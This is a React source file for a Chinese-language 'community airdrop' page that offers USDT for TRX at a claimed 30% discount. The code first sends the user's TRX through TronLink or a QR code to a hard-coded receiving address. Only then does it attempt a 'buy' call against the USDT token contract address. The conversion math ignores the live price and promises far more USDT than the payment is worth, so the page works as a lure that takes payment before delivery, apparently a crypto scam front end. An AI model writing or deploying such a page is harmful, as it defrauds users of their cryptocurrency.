import React, { useState, useEffect } from 'react';
import QRCode from 'react-qr-code';

const App = () => {
  const [trxAmount, setTrxAmount] = useState('');
  const [usdtAmount, setUsdtAmount] = useState('');
  const [trxPrice, setTrxPrice] = useState(null);
  const [tronWeb, setTronWeb] = useState(null);
  const [showQR, setShowQR] = useState(false);
  const [qrString, setQrString] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [transactionStatus, setTransactionStatus] = useState('');
  const [transactionIds, setTransactionIds] = useState({ trx: '', buy: '' });

  // 收款地址（接收TRX）
  const paymentAddress = 'TWRAzGd4KGgyESBbe4EFaADFMFgG999BcD';
  // 合约地址（处理USDT购买逻辑）
  const contractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
  // USDT代币合约地址
  const usdtTokenAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // 示例USDT地址（主网），请确认

  useEffect(() => {
    // 检查TronLink连接
    const checkTronLink = async () => {
      try {
        // 等待TronLink加载
        let attempts = 0;
        const maxAttempts = 10;
        while (attempts < maxAttempts) {
          if (window.tronWeb && window.tronWeb.ready && window.tronWeb.defaultAddress?.base58) {
            setTronWeb(window.tronWeb);
            setTransactionStatus('TronLink已连接');
            return;
          }
          await new Promise(resolve => setTimeout(resolve, 1000));
          attempts++;
        }
        setTransactionStatus('未检测到TronLink，请安装并登录TronLink钱包');
      } catch (error) {
        console.error('TronLink连接失败:', error);
        setTransactionStatus('TronLink连接失败，请检查钱包设置或刷新页面');
      }
    };
    checkTronLink();

    // 获取TRX实时价格
    fetch('https://api.coingecko.com/api/v3/simple/price?ids=tron&vs_currencies=usd')
      .then(res => res.json())
      .then(data => setTrxPrice(data.tron?.usd || 0.27))
      .catch(() => setTrxPrice(0.27));
  }, []);

  // 计算可购买的USDT数量
  const calculateUsdt = (trx) => {
    const val = parseFloat(trx);
    if (!val || !trxPrice) return '';
    return (val / 0.7).toFixed(4); // 七折优惠
  };

  // 处理TRX输入变化
  const handleTrxChange = (e) => {
    const val = e.target.value;
    if (/^\d*\.?\d*$/.test(val)) {
      setTrxAmount(val);
      setUsdtAmount(calculateUsdt(val));
      setShowQR(false);
      setTransactionIds({ trx: '', buy: '' });
    }
  };

  // 检查合约USDT余额
  const checkContractBalance = async (usdtAmountToBuy) => {
    if (!tronWeb) return true; // 如果无tronWeb，跳过检查
    try {
      const usdtContract = await tronWeb.contract().at(usdtTokenAddress);
      const balance = await usdtContract.balanceOf(contractAddress).call();
      const balanceInUsdt = tronWeb.fromSun(balance); // 假设USDT为6位小数
      return parseFloat(balanceInUsdt) >= usdtAmountToBuy / 1e6;
    } catch (error) {
      console.error('检查余额失败:', error);
      return false;
    }
  };

  // 处理购买逻辑
  const handleBuy = async () => {
    const val = parseFloat(trxAmount);
    if (!val || val <= 0) {
      setTransactionStatus('请输入有效的TRX数量');
      return;
    }

    setIsLoading(true);
    setTransactionStatus('');
    setTransactionIds({ trx: '', buy: '' });

    if (tronWeb && tronWeb.defaultAddress?.base58) {
      try {
        // 获取用户地址
        const userAddress = tronWeb.defaultAddress.base58;
        if (!userAddress) {
          throw new Error('未检测到用户钱包地址');
        }

        // 检查合约USDT余额
        const usdtAmountToBuy = parseFloat(calculateUsdt(val)) * 1e6; // USDT 6位小数
        const hasEnoughBalance = await checkContractBalance(usdtAmountToBuy);
        if (!hasEnoughBalance) {
          throw new Error('合约USDT余额不足，无法完成购买');
        }

        // 步骤1：发送TRX到paymentAddress
        const amountInSun = tronWeb.toSun(val);
        const trxTransaction = await tronWeb.trx.sendTransaction(paymentAddress, amountInSun, {
          from: userAddress,
          shouldPollResponse: true,
        });

        const trxTxId = trxTransaction.txid || trxTransaction;
        setTransactionIds(prev => ({ ...prev, trx: trxTxId }));
        setTransactionStatus(`TRX已发送到收款地址 ${paymentAddress}，交易ID: ${trxTxId}`);

        // 步骤2：调用合约的buy函数（无TRX）
        const contract = await tronWeb.contract().at(contractAddress);
        try {
          const buyTransaction = await contract.buy(usdtAmountToBuy).send({
            callValue: 0, // 不发送TRX
            shouldPollResponse: true,
            feeLimit: 100000000, // 设置费用限制
            from: userAddress,
          });

          setTransactionIds(prev => ({ ...prev, buy: buyTransaction }));
          setTransactionStatus(
            prev => `${prev}\nUSDT购买成功！交易ID: ${buyTransaction}\n请检查收款地址 ${paymentAddress} 是否收到TRX。`
          );
          setTrxAmount('');
          setUsdtAmount('');
        } catch (buyError) {
          let errorMessage = buyError.message || '未知错误';
          if (buyError.output?.contractResult) {
            const result = buyError.output.contractResult[0];
            if (result) {
              try {
                const decoded = Buffer.from(result.slice(136), 'hex').toString('utf8');
                errorMessage = `合约回滚：${decoded}`;
              } catch {
                errorMessage = '无法解析revert原因';
              }
            }
          }
          setTransactionStatus(
            prev => `${prev}\nUSDT购买失败：${errorMessage}\nTRX已发送，请联系支持（support@example.com）处理。`
          );
        }
      } catch (error) {
        console.error('交易错误:', error);
        setTransactionStatus(`购买失败：${error.message || '请检查网络、钱包或刷新页面'}`);
      }
    } else {
      // 如果没有TronLink，生成二维码
      const formattedAmount = val.toFixed(6);
      const qrData = `tron:${paymentAddress}?amount=${formattedAmount}`;
      setQrString(qrData);
      setShowQR(true);
      setTransactionStatus(
        `请使用TronLink钱包扫描二维码进行支付，或手动输入以下信息。\n二维码数据: ${qrData}\n注意：如果金额未自动填充，请手动输入 ${formattedAmount} TRX。`
      );
    }

    setIsLoading(false);
  };

  // 复制文本到剪贴板
  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text).then(() => {
      setTransactionStatus(prev => `${prev}\n已复制到剪贴板！`);
    }).catch(() => {
      setTransactionStatus(prev => `${prev}\n复制失败，请手动复制。`);
    });
  };

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center px-4">
      <div className="bg-white rounded-2xl shadow-xl w-full max-w-md p-6 text-center space-y-5">
        {/* Logo & Title */}
        <div className="flex justify-center items-center space-x-3">
          <img
            src="https://i.imgur.com/pNAm2gN.png"
            alt="USDT Logo"
            className="w-10 h-10"
            onError={(e) => (e.target.style.display = 'none')}
          />
          <h1 className="text-2xl font-bold text-gray-800">USDT</h1>
        </div>

        {/* 宣传语 */}
        <p className="text-sm text-yellow-600 font-medium">
          社区空投活动：TRX七折购买USDT（限时优惠）
        </p>

        {/* 实时价格 */}
        <p className="text-lg font-semibold text-gray-700">
          实时价格：${trxPrice?.toFixed(2) || '0.27'} / TRX
        </p>

        {/* 输入框 */}
        <input
          type="text"
          placeholder="输入TRX数量"
          value={trxAmount}
          onChange={handleTrxChange}
          className="w-full border border-gray-300 rounded-lg py-3 px-4 text-center text-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
        />

        {/* 可购买USDT显示 */}
        <div className="text-sm text-gray-600">
          可购买USDT: <span className="font-semibold">{usdtAmount || '0.0000'}</span>
        </div>

        {/* 购买按钮 */}
        <button
          onClick={handleBuy}
          disabled={isLoading}
          className={`w-full bg-blue-500 text-white text-lg font-semibold py-3 rounded-lg transition ${
            isLoading ? 'opacity-50 cursor-not-allowed' : 'hover:bg-blue-600'
          }`}
        >
          {isLoading ? '处理中...' : '购买'}
        </button>

        {/* 交易状态 */}
        {transactionStatus && (
          <p
            className={`text-sm ${
              transactionStatus.includes('成功') && !transactionStatus.includes('失败')
                ? 'text-green-600'
                : 'text-red-600'
            }`}
          >
            {transactionStatus.split('\n').map((line, index) => (
              <span key={index}>
                {line}
                <br />
              </span>
            ))}
            {transactionIds.trx && (
              <a
                href={`https://tronscan.org/#/transaction/${transactionIds.trx}`}
                target="_blank"
                rel="noopener noreferrer"
                className="underline text-blue-500"
              >
                查看TRX交易
              </a>
            )}
            {transactionIds.buy && (
              <>
                <br />
                <a
                  href={`https://tronscan.org/#/transaction/${transactionIds.buy}`}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="underline text-blue-500"
                >
                  查看USDT交易
                </a>
              </>
            )}
          </p>
        )}

        {/* 二维码展示 */}
        {showQR && qrString && (
          <div className="pt-4 space-y-4">
            <QRCode value={qrString} size={150} className="mx-auto" />
            <p className="text-sm text-gray-500">
              请使用TronLink钱包扫描二维码转账，或手动输入以下信息：
            </p>
            <div className="text-xs text-gray-600 space-y-3">
              <div className="bg-gray-50 p-3 rounded border border-gray-200">
                <p className="font-semibold text-gray-700">收款地址:</p>
                <p className="break-all text-gray-800">{paymentAddress}</p>
                <button
                  onClick={() => copyToClipboard(paymentAddress)}
                  className="mt-2 text-blue-500 underline text-xs hover:text-blue-600"
                >
                  复制地址
                </button>
              </div>
              <div className="bg-gray-50 p-3 rounded border border-gray-200">
                <p className="font-semibold text-gray-700">转账金额:</p>
                <p className="text-gray-800">{trxAmount} TRX</p>
                <button
                  onClick={() => copyToClipboard(trxAmount)}
                  className="mt-2 text-blue-500 underline text-xs hover:text-blue-600"
                >
                  复制金额
                </button>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default App;
